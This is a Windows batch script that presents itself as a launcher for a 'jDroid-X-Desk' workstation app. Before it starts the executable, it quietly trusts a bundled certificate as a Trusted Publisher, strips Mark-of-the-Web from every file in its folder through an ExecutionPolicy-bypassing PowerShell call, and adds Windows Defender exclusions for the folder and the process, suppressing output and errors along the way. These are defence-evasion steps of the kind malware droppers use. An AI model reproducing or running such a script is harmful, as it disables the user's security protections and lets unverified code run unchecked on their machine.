@echo off
title jDroid-X-Desk Universal Launcher
cd /d "%~dp0"
echo ======================================================================
echo   jDroid-X-Desk Portable Workstation Launcher (jDroid-X Studio)
echo ======================================================================
echo [1/3] Whitelisting certificate authority in Trusted Publishers...
if exist "%~dp0jDroid-X-Enterprise.cer" (
    certutil -user -addstore TrustedPublisher "%~dp0jDroid-X-Enterprise.cer" >nul 2>&1
)
echo [2/3] Unblocking Windows SmartScreen Mark-of-the-Web (MOTW)...
powershell -NoProfile -ExecutionPolicy Bypass -Command "Get-ChildItem -Path '%~dp0' -Recurse | Unblock-File -ErrorAction SilentlyContinue"
echo [3/3] Setting Windows Defender whitelist exception (if elevated)...
powershell -NoProfile -ExecutionPolicy Bypass -Command "Add-MpPreference -ExclusionPath '%~dp0' -ExclusionProcess 'jDroid-X-Desk.exe' -ErrorAction SilentlyContinue" >nul 2>&1
echo.
echo Launching jDroid-X-Desk Enterprise Console...
start "" "%~dp0jDroid-X-Desk.exe"
exit /b 0
